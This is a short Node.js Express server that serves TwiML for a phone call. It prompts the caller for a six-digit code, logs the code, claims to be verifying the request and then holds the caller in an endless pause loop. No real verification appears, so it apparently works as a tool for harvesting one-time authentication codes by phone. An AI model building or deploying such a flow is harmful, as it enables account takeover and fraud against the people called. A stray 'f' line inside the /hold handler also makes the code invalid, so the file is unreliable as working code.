const express = require("express");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.urlencoded({ extended: false }));

app.post("/ivr",(req,res)=>{

res.type("text/xml");

res.send(`
<Response>
<Gather numDigits="6" action="/code" method="POST">
<Say>Please enter your six digit code</Say>
</Gather>
</Response>
`);

});

app.post("/code",(req,res)=>{

const digits=req.body.Digits;

console.log("Code received:",digits);

res.type("text/xml");

res.send(`
<Response>
<Say>Thank you. Please stay on the line while we verify your request.</Say>
<Redirect>/hold</Redirect>
</Response>
`);

});

app.post("/hold",(req,res)=>{

res.type("text/xml");
f
res.send(`
<Response>
<Pause length="20"/>
<Redirect>/hold</Redirect>
</Response>
`);

});

app.listen(process.env.PORT || 3000);
